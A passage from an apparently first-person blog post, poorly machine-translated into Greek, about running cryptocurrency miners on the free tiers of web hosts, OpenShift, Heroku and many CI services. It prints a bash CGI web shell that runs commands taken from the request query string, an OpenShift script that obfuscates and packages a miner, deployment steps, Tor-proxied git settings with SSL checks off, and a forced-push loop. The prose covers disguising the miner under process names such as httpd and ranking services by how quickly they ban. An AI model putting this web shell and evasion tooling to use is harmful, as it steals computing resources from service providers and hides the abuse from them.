προγράμματα συνδρομής που έχουν λογικά όρια πόρων, από την άλλη πλευρά κάθε δωρεάν πρόγραμμα έχει γελοία όρια<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> Το Το cPanel σάς επιτρέπει να ορίσετε χειριστές για διαφορετικές επεκτάσεις αρχείων. Αυτό μας επιτρέπει να εκτελέσουμε σενάρια κελύφους μέσω<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> με ένα αίτημα http έναντι ενός σεναρίου κελύφους που μεταφορτώθηκε στον διακομιστή. Αυτού του είδους οι διεπαφές μοιάζουν με τα κελύφη ιστού<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> Το Ένα απλό κέλυφος ιστού bash<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Είναι προτιμότερο να βασίζεστε μόνο σε ενσωματωμένα, καθώς η απομάκρυνση πρόσθετων διαδικασιών ενδέχεται να μην επιτρέπεται σε διαδικτυακές φυλακές, αλλά είναι πάντα δυνατό<code>exec</code> που μας επιτρέπει να χρησιμοποιούμε τα περισσότερα βοηθητικά προγράμματα γραμμής εντολών. Τα περισσότερα κελύφη ιστού είναι γραμμένα σε άλλες γλώσσες δέσμης ενεργειών όπως python ή php καθώς δεν χρειάζεται να ανησυχείτε για το πιρούνι.<p>Σε περιβάλλον cpanel είναι προτιμότερο να χρησιμοποιήσετε ένα στατικό όνομα για τη διαδικασία miner, όπως<code>httpd</code> ή<code>php-fpm</code> επειδή<code>cgi</code> βασίζεται σε πολλαπλή επεξεργασία, επομένως οι διακομιστές είναι πάντα γεμάτοι με πολλές διαδικασίες που ονομάζονται έτσι, αν και ένας προσεκτικός παρατηρητής θα πρέπει να παρατηρήσει το<em> πολυστρωματικό</em> μοτίβο χρήσης που σίγουρα δεν είναι συνηθισμένο (ή πιθανό) για γλώσσες όπως το perl, php, ruby ​​ή python!<p>Οι διαδικασίες έχουν επίσης ένα χρονικό όριο από προεπιλογή, (1 ώρα, 1 ημέρα κ.λπ ..), για αυτό χρησιμοποιούμε απλώς μια εργασία cron που επανεκκινεί το σταγονόμετρο.<p>Αυτό απαιτούσε πολύ χειροκίνητη επεξεργασία, το cpanel api για να αυτοματοποιήσει αυτό δυστυχώς δεν εκτίθεται στους τελικούς χρήστες, οπότε η φιλοξενία ιστοσελίδων είναι ένας ακατάστατος και βαρετός στόχος για το minpper dropper.<h3 id=web_environments><a class=header-anchor href=#web_environments> Περιβάλλοντα Ιστού</a></h3><p>Υπάρχουν<em> SaaS</em> παρόχους που έχουν έναν επεξεργαστή ιστού σε συνδυασμό με ένα κοντέινερ, όπως π.χ.<a href="with a free tier before getting acquired by amazon"> σύννεφο 9</a> , [οπουδήποτε], [κωδικός]. Η τοποθέτηση του σταγονόμετρου εδώ είναι εύκολη (έχετε ένα πλήρες περιβάλλον), αλλά η διατήρηση της λειτουργίας είναι επιβάρυνση, καθώς κάθε διαδραστικός επεξεργαστής ιστού τερματίζει τη συνεδρία του αμέσως μετά το κλείσιμο της ιστοσελίδας και το δοχείο, συνεπώς, τίθεται σε κατάσταση αδράνειας (εκτός εάν αμοιβή φυσικά).<p>Η παράκαμψη αυτού μπορεί να σημαίνει μόνο ότι πρέπει να κρατήσουμε τις συνεδρίες ανοιχτές, ορισμένες δέσμες ενεργειών με τον [κουκλοπαίχτη] πέτυχαν το επιθυμητό αποτέλεσμα, αλλά η πολύωρη λειτουργία, η διαρροή μνήμης, οι φουσκωμένες ιστοσελίδες των SPA είναι σίγουρα μη ελκυστική και όχι κρυφή, επειδή από το πάροχο του backend, μια συνεδρία που άνοιξε 24/7 θα είναι σίγουρα ύποπτη. Πράγματι, τα περιβάλλοντα ιστού είναι επίσης ακατάστατοι και βαρετοί στόχοι.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Δωρεάν υπηρεσίες εφαρμογών</a></h3><p>Αυτό είναι κυρίως<a href="when it used to have a free tier"> ανοιχτη αλλαγη</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> και [heroku]. Openshift, το kubernetes ήταν κάπως απλό να αναπτυχθεί, αλλά γεμάτο ανακατατάξεις διαμόρφωσης, εδώ είναι ένα απόσπασμα:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(<span class=hljs-built_in>cat</span> vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(<span class=hljs-built_in>cat</span><span class=hljs-variable>$launcher</span> | <span class=hljs-built_in>tail</span> +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
<span class=hljs-built_in>chmod</span> +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Αυτό ήταν το σενάριο που χρησιμοποιήθηκε για την κατασκευή του δοχείου εξόρυξης που απαιτούσε ένα πρότυπο yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Όμως η όλη διαδικασία περιελάμβανε αρκετά βήματα!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span><span class=hljs-built_in>mv</span><span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(<span class=hljs-built_in>date</span> +%s)}</code></pre><p>Σε ψευδοκώδικα:<ul><li><p>δημιουργήσει το έργο<li><p>δημιουργήστε την εφαρμογή χωρίς εικόνα<li><p>φτιάξτε το δοχείο εξόρυξης<li><p>αναπτύξτε το κοντέινερ με ένα config ανάπτυξης (αφαίρεση kubernetes)<li><p>ανάπτυξη της ανάπτυξης</ul><p>ο<code>build-build</code> τα σενάρια αντί αυτού δημιούργησαν α<em> χτίζω</em> δοχείο που θα εξορύσσεται για μερικές ώρες κάθε φορά. Τα build και τα κανονικά pod έχουν ξεχωριστούς πόρους στο openshift, οπότε τα εκμεταλλευτήκαμε και τα δύο. Το Openshift ήταν συνολικά μια κακή εμπειρία αφού πέρασε από 4 διαφορετικές κυκλοφορίες (ίσως και περισσότερες, σταμάτησα να παρακολουθώ μετά από λίγο) και καθένα από αυτά απαιτούσε αλλαγές στις διαμορφώσεις, δεν είχαν διαδρομές αναβάθμισης και όλα επαναλήφθηκαν γρήγορα και ήταν συνηθισμένο για να σταματήσουν οι κατασκευές/οι λοβοί και να μην μαζεύονται σκουπίδια ... συνήθως έκαναν χειροκίνητες επανεκκινήσεις κάθε τόσο, ίσως το kubernetes ήταν απλώς σφάλμα :)<p>Η διαμόρφωση Heroku ήταν λίγο πιο απλή (δεν περιλαμβάνει kubernetes). Εκτός από την κατασκευή του εμπορευματοκιβωτίου, η οποία ήταν παρόμοια με αυτή του openshift, τα υπόλοιπα ήταν μόνο δύο εντολές cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Το δοχείο σπρώχτηκε απευθείας με το docker στο μητρώο heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Η τριβή με το heroku (η δωρεάν βαθμίδα εξακολουθεί να ισχύει μέχρι τη στιγμή της σύνταξης) είναι ότι το dynos μπορεί να τρέξει μόνο για 22 ημέρες το μήνα, οπότε απαιτούσε κάποια χειροκίνητη διαχείριση κάθε μήνα, και πάλι αμήχανη και βαρετή. Πραγματοποίησαν στην αρχή κάποια κύματα απαγόρευσης και στη συνέχεια απενεργοποίησαν τις εγγραφές μέσω του TOR, είμαι σίγουρος ότι ήμουν η αιτία αυτού.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Εμπορευματοκιβώτια CI ή VM</a></h3><p>Αυτοί ήταν οι πιο συνεργικοί στόχοι για το σταγονόμετρο μας. Υπάρχουν πολλά<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> εταιρείες, πολλές από τις οποίες καίνε χρήματα στους επενδυτές προσφέροντας δωρεάν επίπεδα με την ελπίδα να συγκεντρώσουν κάποιο μερίδιο αγοράς στην επιχείρηση τεχνολογικών υποδομών.<p>Όλες αυτές οι υπηρεσίες προσφέρουν διαφορετικούς πόρους, έχουν διαφορετικές απαιτήσεις διαμόρφωσης και λειτουργούν σε διαφορετικά περιβάλλοντα. Ποτέ δεν σκέφτηκα να αυτοματοποιήσω την εγγραφή λογαριασμού επειδή τέτοια πράγματα είναι τρομακτικά για προγραμματισμό, προσπαθώ να τα αποφεύγω συνεχώς, οπότε απλώς υπέμεινα για κάποιες φορές μη αυτόματες εγγραφές καθώς ήμουν περίεργος για το τι είδους απάντηση κατά των ανεπιθύμητων μηνυμάτων θα έπαιρνα (και πόσο διαφορετικό από τα υπόλοιπα!). Μπορείτε να μαντέψετε κάποια πράγματα για τη διαχείριση μιας εταιρείας από τον τρόπο με τον οποίο χειρίζεται τα ανεπιθύμητα μηνύματα:<ul><li><p>Εκτελεί κύματα απαγόρευσης; Στη συνέχεια, έχουν μη αυστηρές πολιτικές, τα προβλήματα αντιμετωπίζονται χειροκίνητα και κατά περίπτωση<li><p>Απαιτεί επαλήθευση τηλεφώνου; Είχαν ήδη κακοποιηθεί στο παρελθόν<li><p>Ανταποκρίνονται σε μεγάλη χρήση πόρων; Λειτουργούν με περιορισμένο προϋπολογισμό<li><p>Εφαρμόζουν περιορισμούς λογαριασμών ή απαγορεύσεις σκιών; Αν σκιάζουν την απαγόρευση, έχουν κακούς συσαδμίνους.</ul><p>Υπάρχει επίσης μια φιλοσοφική ερώτηση: Εάν μια υπηρεσία σας επιτρέπει να κάνετε κατάχρηση του συστήματός τους για μεγάλο χρονικό διάστημα, σημαίνει ότι έχουν μια κορυφαία υποδομή που μπορεί να χειριστεί το φορτίο ή απλώς κακό έλεγχο του συστήματός τους; Και πρέπει να λάβετε υπόψη την ισορροπία μεταξύ προσβασιμότητας και ασφάλειας, ένα πολύ ασφαλές σύστημα μπορεί να μειώσει τη διατήρηση του χρήστη.<p>Ακολουθεί ένας πίνακας που δείχνει ορισμένες υπηρεσίες στις οποίες αναπτύχθηκα:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>διαμόρφωση<th style=text-align:center>εκτέλεση<th style=text-align:center>μπαν-σφυρί<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>κακό<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Ο Τράβις<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:green;text-align:center>Καλός<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:red;text-align:center>κακό<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:green;text-align:center>Καλός<td style=color:green;text-align:center>Καλός<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>κακό<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Σηματοφόρος<td style=color:green;text-align:center>Καλός<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Λιμενεργάτης<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:green;text-align:center>Καλός<tr><td style=text-align:center>Αποβάθρα<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>κακό<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:red;text-align:center>κακό<tr><td style=text-align:center>Azure-αγωγοί<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:red;text-align:center>κακό<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>κακό<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>φίλε<td style=color:red;text-align:center>κακό<td style=color:red;text-align:center>κακό<td style=color:red;text-align:center>κακό<tr><td style=text-align:center>Κηφήνας<td style=color:red;text-align:center>κακό<td style=color:green;text-align:center>Καλός<td style=color:red;text-align:center>κακό<tr><td style=text-align:center>Αποστολέας<td style=color:red;text-align:center>κακό<td style=color:#ff0;text-align:center>Μεσαίο<td style=color:red;text-align:center>κακό<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>κακό<td style=color:green;text-align:center>Καλός<td style=color:#ff0;text-align:center>Μεσαίο<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>κακό<td style=color:green;text-align:center>Καλός<td style=color:red;text-align:center>κακό</table><p>Στο πλαίσιο αυτό, α<span style=color:green> Καλός</span> διαμόρφωση σημαίνει ότι δεν χρειάστηκε πολύς χρόνος για τη διαμόρφωση ενός<code>ci</code> εργασία για τη διαδικασία εξόρυξης (όπως όλες οι υπηρεσίες που βασίζονται σε έναν πίνακα ελέγχου ιστού αντί για ένα αρχείο τελεία αποθήκη ήταν μια αγγαρεία),<span style=color:red> κακό</span><code>ban-hammer</code> σημαίνει ότι ήταν δύσκολο να εγγραφείτε στην υπηρεσία ή ότι οι λογαριασμοί θα απαγορευτούν πιο επιθετικά.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> απαιτεί τη ρύθμιση ενός έργου, την εξαγωγή συμπερασμάτων για το περιβάλλον, την αρχιτεκτονική του στόχου, τη διαδικασία εκτέλεσης και άλλα πράγματα, ήταν πολύ χρονοβόρο για τη ρύθμιση μιας κατασκευής, ώστε να έχει κακή βαθμολογία στη διαμόρφωση.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> φίλε</a> , [Ο Codefresh] είχε επίσης πολλά χειροκίνητα μη δηλωτικά βήματα διαμόρφωσης.<p>Υπηρεσίες όπως [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> φίλε</a> εφαρμόζει απαγορεύσεις σκιών στους λογαριασμούς, οι απαγορεύσεις σκιών είναι κακές, καθώς σας αφήνουν να μαντέψετε αν κάτι δεν πάει καλά με τη διαμόρφωσή σας ή όχι. Με ορισμένες υπηρεσίες μπορείτε να μαντέψετε τον λόγο της απαγόρευσης (σχεδόν η κατασκευή σας πήρε πολύ χρόνο ή χτίσατε πολλές φορές σε σύντομο χρονικό διάστημα), για κάποιες άλλες όπως [Azure-pipelines] υποθέτω ότι εφάρμοσαν κάποιο είδος δακτυλικών αποτυπωμάτων στα αποθετήρια των χρηστών καθώς οι απαγορεύσεις έρχονταν ακόμη και χωρίς καμιά κατάχρηση πόρων, το azure και το vercel ήταν επίσης περιορισμένα<code>DNS</code> πρόσβαση σε μηχανήματα δημόσιας κατασκευής, οπότε αυτό ήταν πρόσθετη τριβή που έπρεπε να ξεπεραστεί με ειδική σήραγγα.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Κηφήνας</a> έδωσε πρόσβαση σε ολόκληρο επεξεργαστή 16+ πυρήνων, αλλά κατέληξε σε απαγόρευση μετά από 2 κατασκευές<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> δίνει επίσης πρόσβαση σε ισχυρούς οικοδεσπότες κατασκευής και δεν απαγόρευσε τόσο επιθετικά όσο το drone.<p>Οι αγαπημένες μου υπηρεσίες όχι λόγω κερδοφορίας αλλά για ευκολία και ευκολία (επίσης με άλλα έργα) ήταν<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Ο Τράβις</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Σηματοφόρος</a> και<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> Το Το Travis είναι σαν το τυπικό CI και είναι πολύ ευέλικτο, το Semaphore είναι το μόνο<code>DSL</code> Για<code>CI</code> που φαινόταν προσιτή και καλά αν και αντί για μια ατελείωτη ακολουθία μακαρονισμένων πλαισίων ελέγχου όπως άλλες διεπαφές χρήστη, και Docker μόνο για την απλότητα χαρτογράφησης αρχείων dockerfiles σε κατασκευές.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Δημιουργεί διαμορφώσεις</a></h3><p>Οι κατασκευές προκλήθηκαν είτε από εργασίες cron που προσφέρονται από υπηρεσίες ιστού είτε από git commits. Έτσι, έπρεπε να παρακολουθείτε τη σκουπιδιά μάρκες πρόσβασης ή κλειδιά ssh για να διαχειριστείτε όλες τις δεσμεύσεις git. Wasταν επίσης σημαντικό να μην υπερβολικά ανεπιθύμητα μηνύματα και να χρησιμοποιείτε διακομιστές μεσολάβησης όταν πιέζετε στα αποθετήρια που ρυθμίζουν το git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Χρησιμοποιώντας υπηρεσίες φιλοξενίας git, το github ήταν το πιο λεπτομερές για τις απαγορεύσεις, αλλά εκτελέστηκαν μόνο μετά από αναφορές κατάχρησης από διαχειριστές υπηρεσιών ci, το gitlab εκτέλεσε ένα κύμα απαγόρευσης μία φορά, όταν προσπάθησα να ανανεώσω τη δοκιμή CI (απρόσεκτα). Δεν έχω λάβει ποτέ απαγόρευση για λογαριασμό bitbucket. Για να (αναγκάσουμε) να πιέσουμε τις δεσμεύσεις git, έχουμε έναν βρόχο μεγάλης διάρκειας που επισημαίνει ξανά το αποθετήριο git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(<span class=hljs-built_in>ls</span> -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span><span class=hljs-built_in>sleep</span><span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span><span class=hljs-built_in>sleep</span> 1
<span class=hljs-keyword>done</span></code></pre><p>Μπορεί να είναι πιθανό ότι η δύναμη που σπρώχνει με αυτόν τον τρόπο δεν είναι κάτι που αρέσει πολύ στο github και θα μπορούσε να ήταν μια αιτία για την επισήμανση λογαριασμών. Η συνάρτηση ετικέτας που έχει επιφορτιστεί με τη δύναμη να σπρώχνει διαφορετικές δεσμεύσεις, χρησιμοποιεί έναν ιστότοπο (τον οποίο μπορείτε να αναζητήσετε πολύ εύκολα) που δίνει μερικές τυχαιοποιημένες δεσμεύσεις. Δεν είμαι σίγουρος πόσο αυτό βοηθά, αφού το ίδιο το περιεχόμενο των δεσμεύσεων είναι προφανώς ύποπτο για την περίπτωσή μου. Επίσης, με δάγκωσε μια φορά στον κώλο, αφού οι υποθέσεις που επιστρέφονται με αυτήν την εντολή μπορούν να περιλαμβάνουν βρισιές, μία από τις δεσμεύσεις μου παραλήφθηκε από ένα twitter bot που παρακολουθεί τις git δεσμεύσεις με βρισιές! Πρόσθεσα μια μαύρη λίστα για κακές λέξεις μετά το περιστατικό.<p>Δεν έχω πραγματικά εμβαθύνει σε ασαφείς γκιτ δεσμεύσεις και σε θολωτά αποθετήρια git. Η μόνη περίπτωση όπου χρησιμοποιούσα ένα πιο περίτεχνο αποθετήριο ήταν με το Bitrise, καθώς δεν μπορούσατε να ρυθμίσετε μια κατασκευή εάν το σύστημα δεν αναγνωρίζει ένα περιβάλλον (όπως εφαρμογές για κινητά), αλλά ακόμη και τότε δεν υπήρχε καμία περιστροφή και ήταν πάντα το ίδιο αποθετήριο, αρκετά εύκολο να εντοπιστεί.<p>Συνολικά, αν έπρεπε να σχεδιάσω μια καμπύλη καμπάνας γύρω από τη βέλτιστη ώρα για εξόρυξη<em> χωρίς</em>η απαγόρευση λογαριασμών, σε όλες τις δοκιμασμένες υπηρεσίες, θα έχει κέντρο με διάρκεια κατασκευής περίπου 1 ώρα, μία φορά την ημέρα. Για τους πυρήνες της CPU, εκτός από ένα ζευγάρι ψεύτες (όπως το drone), οι περισσότερες υπηρεσίες αναμένουν ότι θα χρησιμοποιήσετε όλο το ποσό των πόρων που σας 